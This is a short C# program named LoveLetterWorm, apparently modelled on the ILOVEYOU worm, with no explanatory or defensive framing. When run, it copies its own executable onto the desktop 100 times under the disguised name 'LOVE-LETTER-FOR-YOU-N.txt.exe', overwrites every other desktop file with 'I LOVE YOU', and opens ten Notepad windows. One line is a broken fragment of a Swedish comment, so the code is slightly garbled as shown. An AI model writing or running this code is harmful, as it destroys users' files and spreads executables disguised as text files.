using System;
using System.IO;
using System.Diagnostics;

class LoveLetterWorm {
    static void Main() {
        
        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        
         fil) körs ifrån
        string currentExe = Process.GetCurrentProcess().MainModule.FileName;

        Console.WriteLine("Spread the love...");

         
        for (int i = 0; i < 100; i++) {
            try {
                string newCopy = Path.Combine(desktopPath, "LOVE-LETTER-FOR-YOU-" + i + ".txt.exe");
                File.Copy(currentExe, newCopy, true);
            } catch { }
        }

       
        string[] files = Directory.GetFiles(desktopPath);
        foreach (string file in files) {
            try {
                
                if (!file.Contains("LOVE-LETTER")) {
                    File.WriteAllText(file, "I LOVE YOU\nI LOVE YOU\nI LOVE YOU");
                    
                }
            } catch { }
        }

         
        for (int i = 0; i < 10; i++) {
            Process.Start("notepad.exe"); 
        }

        Console.WriteLine("Desktop conquered.");
        Console.ReadLine();
    }
}